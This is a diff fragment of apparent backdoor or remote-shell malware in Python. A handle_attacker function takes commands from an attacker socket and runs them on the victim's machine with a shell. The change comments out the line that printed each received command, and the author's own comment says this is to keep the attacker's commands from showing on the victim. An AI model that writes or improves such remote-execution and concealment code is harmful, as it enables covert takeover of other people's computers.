@@ -30,7 +30,7 @@ def handle_attacker(attacker_sock, LINE_LEN):
             cmd = attacker_sock.recv(LINE_LEN).decode('utf-8')
             if not cmd:
                 break
-            print(f"Received command: {cmd}")
+            #print(f"Received command: {cmd}") i commented this line out because it prints out the command the attacker wants to run on the victim
 
             try:
                 output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
